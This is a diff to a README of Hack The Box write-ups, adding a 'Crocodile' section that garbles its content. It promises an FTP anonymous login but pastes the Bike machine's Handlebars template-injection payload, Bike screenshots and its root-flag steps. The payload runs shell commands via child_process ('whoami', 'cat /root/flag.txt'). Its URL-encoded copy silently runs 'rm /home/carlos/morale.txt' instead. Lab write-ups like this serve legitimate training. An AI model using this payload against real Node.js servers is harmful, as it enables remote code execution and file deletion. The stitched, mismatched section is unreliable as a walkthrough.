@@ -87,14 +87,14 @@ Hack The Box provides a safe and legal environment for users to practice their s
 <!-- GETTING STARTED -->
 # 1. Bike
 
-In the "Tier 1 Bike" challenge, users are tasked with gaining access to a web server that is vulnerable to common web application attacks, such as SQL injection and command injection. The objective is to find and exploit these vulnerabilities to gain access to the server and retrieve a flag file.
+In the "Tier 1 Bike" challenge, users are tasked with gaining access to a web server that is vulnerable to common web application attacks, such as SQL injection and command injection. The objective is to find and exploit these vulnerabilities to gain access to the server and retrieve a flag file. Actually these machine have SSTI or Server Side Template Injection vulnerabilities.
 
 ### Process
 
 After active the machine I got a ip-10.129.213.238. Now I need to Network scanning and reconnaissance & in this case i use nmap.
 * nmap
   ```sh
-  nmap -sS -V 10.129.213.238
+  nmap -sS -sV 10.129.213.238
   ```
 <p align="center">
 <img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/nmap%20scan.png">
@@ -156,6 +156,89 @@ After replace the cat /root/flag.txt instead of whoami, There I got the root fla
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
+
+# 2. Crocodile
+
+The Crocodile room on Hack The Box is designed to test skills in web application penetration testing. To complete this room, will need to find and exploit vulnerabilities in a web application running on a server.
+
+Here are some steps for solving this machine:
+
+● Start by enumerating the web application using tools such as Nmap or Dirbuster to identify the endpoints, directories, and files that are accessible on the web         server.
+
+● Once identified the endpoints and directories, use tools such as Burp Suite or OWASP ZAP to intercept and analyze the requests and responses to identify potential     vulnerabilities such as SQL injection, XSS, or CSRF.
+
+● Use the information gathered in the previous steps to launch attacks and exploit the vulnerabilities in the web application.
+
+● Keep detailed notes of findings and progress throughout the process.
+
+● Finally, when successfully completed the room, some time to reflect on what you have learned and how you can apply this knowledge to improve your skills in web         application penetration testing.
+
+### Process
+
+After active the machine I got a ip-10.129.213.238. Now I need to Network scanning and reconnaissance & in this case i use nmap.
+* nmap
+  ```sh
+  nmap -sS -sV 10.129.170.102
+  ```
+<p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Crocodile/nmap%20scan%20and%20default%20script.png">
+</p>
+
+I got 21-FTP port and 80-http port open after the scanning.<br><br>
+Let's check the ftp annonymous login
+
+   ```sh
+   {{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').exec('whoami');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+```sh
+   URLencoded:
+%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
+   ```
+   
+* Burpsuite<br>
+Here i apply the Handlebars (NodeJS) URL encoded Payload on post request's email section. But I got server error code 500.<br>
+<p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/apply%20payload%20with%20url%20encode.png">
+</p>
+For avoid these error I replace the process.mainmodule.require instead of return require.
+
+   ```sh
+   {{this.push "process.mainmodule.require('child_process').execSync('whoami');"}}
+```
+
+ And Here I got the RCE.
+ <p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/payload%20to%20gain%20rce.png">
+</p>
+After replace the cat /root/flag.txt instead of whoami, There I got the root flag.
+
+   ```sh
+   {{this.push "process.mainmodule.require('child_process').execSync('cat /root/flag.txt');"}}
+```
+
+  <p align="center">
+<img src="https://github.com/MD-SAJID-ICT/Hack-The-Box/blob/master/Bike/root%20flag.png">
+</p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
 
 
 <!-- USAGE EXAMPLES -->
